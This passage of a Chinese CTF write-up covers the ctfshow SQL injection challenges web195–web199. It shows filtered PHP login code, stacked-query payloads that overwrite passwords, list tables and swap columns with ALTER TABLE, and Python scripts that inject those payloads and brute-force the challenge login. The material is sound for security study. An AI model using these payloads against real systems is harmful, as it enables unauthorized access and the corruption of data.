&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web195&#34;&gt;&lt;a href=&#34;#web195&#34; class=&#34;headerlink&#34; title=&#34;web195&#34;&gt;&lt;/a&gt;web195&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;查询语句
  //拼接sql语句查找指定ID用户
  $sql = &amp;quot;select pass from ctfshow_user where username = &amp;#123;$username&amp;#125;;&amp;quot;;


返回逻辑
  //密码检测
  if(!is_numeric($password))&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;密码只能为数字&amp;#39;;
    die(json_encode($ret));
  &amp;#125;

  //密码判断
  if($row[&amp;#39;pass&amp;#39;]==$password)&amp;#123;
      $ret[&amp;#39;msg&amp;#39;]=&amp;#39;登陆成功&amp;#39;;
    &amp;#125;

  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if(preg_match(&amp;#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&amp;#39;|\&amp;quot;|select|union|or|and|\x26|\x7c|file|into/i&amp;#39;, $username))&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;用户名非法&amp;#39;;
    die(json_encode($ret));
  &amp;#125;

  if($row[0]==$password)&amp;#123;
      $ret[&amp;#39;msg&amp;#39;]=&amp;quot;登陆成功 flag is $flag&amp;quot;;
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;update  `ctfshow_user`&lt;/strong&gt;&lt;br&gt;→ 表示要更新一张叫 &lt;strong&gt;&lt;code&gt;ctfshow_user&lt;/code&gt;&lt;/strong&gt; 的表。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;set  `pass` &amp;#x3D; 520&lt;/strong&gt;&lt;br&gt;→ 把这张表里所有行的 &lt;code&gt;pass&lt;/code&gt; 字段的值都改成 &lt;code&gt;520&lt;/code&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;提交两次即可&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第一次触发修改&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第二次登录&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;用户名：0;update`ctfshow_user`set`pass`=520
密码：520
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250826154322059.png&#34; alt=&#34;image-20250826154322059&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;admin&lt;/code&gt; 的十六进制 &lt;code&gt;0x61646d696e&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;更改密码&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;0x61646d696e;update`ctfshow_user`set`pass`=1314
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;登录&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;用户名：0x61646d696e
密码：1314
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250826160822814.png&#34; alt=&#34;image-20250826160822814&#34; style=&#34;zoom: 25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web196&#34;&gt;&lt;a href=&#34;#web196&#34; class=&#34;headerlink&#34; title=&#34;web196&#34;&gt;&lt;/a&gt;web196&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;查询语句
  //拼接sql语句查找指定ID用户
  $sql = &amp;quot;select pass from ctfshow_user where username = &amp;#123;$username&amp;#125;;&amp;quot;;


返回逻辑
  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if(preg_match(&amp;#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&amp;#39;|\&amp;quot;|select|union|or|and|\x26|\x7c|file|into/i&amp;#39;, $username))&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;用户名非法&amp;#39;;
    die(json_encode($ret));
  &amp;#125;

  if(strlen($username)&amp;gt;16)&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;用户名不能超过16个字符&amp;#39;;
    die(json_encode($ret));
  &amp;#125;

  if($row[0]==$password)&amp;#123;
      $ret[&amp;#39;msg&amp;#39;]=&amp;quot;登陆成功 flag is $flag&amp;quot;;
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;select&lt;/code&gt; 没有被过滤&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;用户名：1;select(1)
密码：1
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250826162950860.png&#34; alt=&#34;image-20250826162950860&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web197&#34;&gt;&lt;a href=&#34;#web197&#34; class=&#34;headerlink&#34; title=&#34;web197&#34;&gt;&lt;/a&gt;web197&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;查询语句
  //拼接sql语句查找指定ID用户
  $sql = &amp;quot;select pass from ctfshow_user where username = &amp;#123;$username&amp;#125;;&amp;quot;;


返回逻辑
  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if(&amp;#39;/\*|\#|\-|\x23|\&amp;#39;|\&amp;quot;|union|or|and|\x26|\x7c|file|into|select|update|set//i&amp;#39;, $username))&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;用户名非法&amp;#39;;
    die(json_encode($ret));
  &amp;#125;

  if($row[0]==$password)&amp;#123;
      $ret[&amp;#39;msg&amp;#39;]=&amp;quot;登陆成功 flag is $flag&amp;quot;;
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在 &lt;code&gt;username&lt;/code&gt; 把表全部查询出来，在 &lt;code&gt;password&lt;/code&gt; 里传入表名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果二者相等即可符合判断条件回显出flag&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;用户名：0;show tables
密码：ctfshow_user
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250826163319207.png&#34; alt=&#34;image-20250826163319207&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web198&#34;&gt;&lt;a href=&#34;#web198&#34; class=&#34;headerlink&#34; title=&#34;web198&#34;&gt;&lt;/a&gt;web198&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;查询语句
  //拼接sql语句查找指定ID用户
  $sql = &amp;quot;select pass from ctfshow_user where username = &amp;#123;$username&amp;#125;;&amp;quot;;


返回逻辑
  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if(&amp;#39;/\*|\#|\-|\x23|\&amp;#39;|\&amp;quot;|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop/i&amp;#39;, $username))&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;用户名非法&amp;#39;;
    die(json_encode($ret));
  &amp;#125;

  if($row[0]==$password)&amp;#123;
      $ret[&amp;#39;msg&amp;#39;]=&amp;quot;登陆成功 flag is $flag&amp;quot;;
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;用户名：0;show tables
密码：ctfshow_user
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250826164155005.png&#34; alt=&#34;image-20250826164155005&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;alter table&lt;/code&gt; 可以对已有的表进行修改&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用 &lt;code&gt;alter&lt;/code&gt; 函数可以把 &lt;code&gt;pass&lt;/code&gt; 和 &lt;code&gt;id&lt;/code&gt; 两列进行互换，这样判断 flag 的条件变成对 &lt;code&gt;id&lt;/code&gt; 的检测，而 &lt;code&gt;id&lt;/code&gt; 都是纯数字，因此可以通过爆破正确的 &lt;code&gt;id&lt;/code&gt;，从而获得flag&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;把表 &lt;code&gt;ctfshow_user&lt;/code&gt; 里原来的 &lt;code&gt;pass&lt;/code&gt; 列改名为 &lt;code&gt;temp&lt;/code&gt;，类型改为 &lt;code&gt;varchar(255)&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;（&lt;code&gt;varchar(255)&lt;/code&gt;  指定列的数据类型，长度为 255 个字符）&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;alter table ctfshow_user change column `pass` `temp` varchar(255);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250826170915896.png&#34; alt=&#34;image-20250826170915896&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests

# ===== 配置区 =====
url = &amp;quot;http://b02f6e8a-3983-420d-b68f-67985de999b4.challenge.ctf.show/api/&amp;quot;
target_user_hex = &amp;quot;0x61646d696e&amp;quot;  # admin 的十六进制
password_range = 99               # 爆破密码尝试次数
# ==================

# 第一步：通过注入修改表结构（交换 id 和 pass）
payload = (
    f&amp;quot;&amp;#123;target_user_hex&amp;#125;;&amp;quot;
    &amp;quot;alter table ctfshow_user change column `pass` `temp` varchar(255);&amp;quot;
    &amp;quot;alter table ctfshow_user change column `id` `pass` varchar(255);&amp;quot;
    &amp;quot;alter table ctfshow_user change column `temp` `id` varchar(255);&amp;quot;
)

data1 = &amp;#123;
    &amp;#39;username&amp;#39;: payload,
    &amp;#39;password&amp;#39;: &amp;#39;1&amp;#39;
&amp;#125;

res = requests.post(url=url, data=data1)

# 第二步：爆破密码（实际上是原来的 id）
for i in range(password_range):
    data2 = &amp;#123;
        &amp;#39;username&amp;#39;: target_user_hex,
        &amp;#39;password&amp;#39;: str(i)
    &amp;#125;
    res2 = requests.post(url=url, data=data2)
    if &amp;quot;flag&amp;quot; in res2.json().get(&amp;#39;msg&amp;#39;, &amp;#39;&amp;#39;):
        print(res2.json()[&amp;#39;msg&amp;#39;])
        break
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web199&#34;&gt;&lt;a href=&#34;#web199&#34; class=&#34;headerlink&#34; title=&#34;web199&#34;&gt;&lt;/a&gt;web199&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;查询语句
  //拼接sql语句查找指定ID用户
  $sql = &amp;quot;select pass from ctfshow_user where username = &amp;#123;$username&amp;#125;;&amp;quot;;


返回逻辑
  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if(&amp;#39;/\*|\#|\-|\x23|\&amp;#39;|\&amp;quot;|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(/i&amp;#39;, $username))&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;用户名非法&amp;#39;;
    die(json_encode($ret));
  &amp;#125;

  if($row[0]==$password)&amp;#123;
      $ret[&amp;#39;msg&amp;#39;]=&amp;quot;登陆成功 flag is $flag&amp;quot;;
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;用户名：0;show tables
密码：ctfshow_user
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250826171832141.png&#34; alt=&#34;image-20250826171832141&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;思路：交换 &lt;code&gt;id&lt;/code&gt; 和 &lt;code&gt;pass&lt;/code&gt; 字段，让系统把 &lt;code&gt;pass&lt;/code&gt; 列当作 &lt;code&gt;id&lt;/code&gt; 使用，再通过爆破 &lt;code&gt;id&lt;/code&gt; 拿到flag&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;把原来的 &lt;code&gt;pass&lt;/code&gt; 列改名为 &lt;code&gt;tmp&lt;/code&gt; ，并把数据类型改为 &lt;code&gt;text&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;text&lt;/code&gt; 类型可以存更多字符&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;用户名：0;alter table ctfshow_user change column pass tmp text
密码：0
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250826232149835.png&#34; alt=&#34;image-20250826232149835&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;把 &lt;code&gt;id&lt;/code&gt; 列改成 &lt;code&gt;pass&lt;/code&gt; ，数据类型改为 &lt;code&gt;int&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;用户名：0;alter table ctfshow_user change column id pass int
密码：0
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250826232207547.png&#34; alt=&#34;image-20250826232207547&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;把 &lt;code&gt;tmp&lt;/code&gt; 列改回 &lt;code&gt;id&lt;/code&gt; ，数据类型改为 &lt;code&gt;text&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;用户名：0;alter table ctfshow_user change column tmp id text
密码：0
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250826232220909.png&#34; alt=&#34;image-20250826232220909&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;从 &lt;code&gt;0&lt;/code&gt; 逐个尝试密码&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;用户名：0x61646d696e
密码：0
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250826233159519.png&#34; alt=&#34;image-20250826233159519&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;尝试到 &lt;code&gt;1&lt;/code&gt; 的时候刚好正确&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;用户名：0x61646d696e
密码：1
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250826233133075.png&#34; alt=&#34;image-20250826233133075&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;因此，手动爆破并非良策，可用脚本实现爆破&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解三&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;按照题解二的解题逻辑写脚本&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250826234333108.png&#34; alt=&#34;image-20250826234333108&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests

# ======================
# 配置区

URL = &amp;quot;http://cc616be5-f332-45ce-85a1-7bb69eb1afdf.challenge.ctf.show/api/&amp;quot;
TARGET_USER = &amp;quot;admin&amp;quot;
MAX_TRY = 300
SUCCESS_FLAG = &amp;quot;\\u767b\\u9646\\u6210\\u529f&amp;quot;  # 登陆成功

# 配置区
# ======================


def alter_table():
    &amp;quot;&amp;quot;&amp;quot;修改数据表，把 id 和 pass 对调&amp;quot;&amp;quot;&amp;quot;
    payload = (
        &amp;quot;0;alter table ctfshow_user change column pass tmp text;&amp;quot;
        &amp;quot;alter table ctfshow_user change column id pass int;&amp;quot;
        &amp;quot;alter table ctfshow_user change column tmp id text&amp;quot;
    )
    data = &amp;#123;
        &amp;quot;username&amp;quot;: payload,
        &amp;quot;password&amp;quot;: 1
    &amp;#125;
    _ = requests.post(URL, data=data)


def brute_force_admin():
    &amp;quot;&amp;quot;&amp;quot;爆破 admin 的密码&amp;quot;&amp;quot;&amp;quot;
    target_user_hex = f&amp;quot;0x&amp;#123;TARGET_USER.encode().hex()&amp;#125;&amp;quot;
    for i in range(MAX_TRY):
        data = &amp;#123;
            &amp;quot;username&amp;quot;: target_user_hex,
            &amp;quot;password&amp;quot;: i
        &amp;#125;
        response = requests.post(URL, data=data)
        if SUCCESS_FLAG in response.text:
            print(f&amp;quot;[*] Found! username=&amp;#123;TARGET_USER&amp;#125;, password=&amp;#123;i&amp;#125;&amp;quot;)
            print(f&amp;quot;[*] msg: &amp;#123;response.text&amp;#125;&amp;quot;)
            return
    print(&amp;quot;[!] Password not found within range.&amp;quot;)


if __name__ == &amp;quot;__main__&amp;quot;:
    print(&amp;quot;[*] Altering table (swap id &amp;lt;-&amp;gt; pass)&amp;quot;)
    alter_table()
    print(&amp;quot;[*] Brute forcing admin password&amp;quot;)
    brute_force_admin()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
